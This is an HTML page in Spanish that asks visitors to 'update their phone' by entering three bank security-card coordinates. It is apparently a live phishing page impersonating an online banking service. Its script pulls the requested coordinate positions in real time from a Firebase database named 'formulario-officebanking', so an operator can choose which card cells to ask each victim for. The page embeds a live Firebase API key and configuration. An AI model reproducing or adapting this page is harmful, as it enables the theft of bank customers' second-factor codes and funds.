
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Ingresar Coordenadas</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: white;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .contenedor {
      border: 2px solid red;
      padding: 20px;
      width: 90%;
      max-width: 420px;
      background-color: #fff;
      text-align: center;
    }
    .coordenadas {
      display: flex;
      justify-content: space-between;
      gap: 10px;
      margin-top: 20px;
    }
    .grupo {
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    .grupo label {
      margin-bottom: 5px;
      font-weight: bold;
    }
    .grupo input {
      width: 60px;
      padding: 10px;
      font-size: 18px;
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="contenedor">
    <h2>Necesitamos actualizar tu tel√©fono</h2>
    <div class="coordenadas">
      <div class="grupo">
        <label id="coord1-label"></label>
        <input maxlength="2" />
      </div>
      <div class="grupo">
        <label id="coord2-label"></label>
        <input maxlength="2" />
      </div>
      <div class="grupo">
        <label id="coord3-label"></label>
        <input maxlength="2" />
      </div>
    </div>
  </div>

  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyBdPWoveN6ftUuIsUtnF1hA5eB7UWZR8aQ",
      authDomain: "formulario-officebanking.firebaseapp.com",
      databaseURL: "https://formulario-officebanking-default-rtdb.firebaseio.com",
      projectId: "formulario-officebanking",
      storageBucket: "formulario-officebanking.appspot.com",
      messagingSenderId: "604053438195",
      appId: "1:604053438195:web:188de91bee9a62f0d3c186"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    firebase.database().ref('coordenadas_solicitadas').on('value', snap => {
      const valor = snap.val() || "";
      const partes = valor.trim().split(" ");
      document.getElementById("coord1-label").textContent = partes[0] || "";
      document.getElementById("coord2-label").textContent = partes[1] || "";
      document.getElementById("coord3-label").textContent = partes[2] || "";
    });
  </script>
</body>
</html>
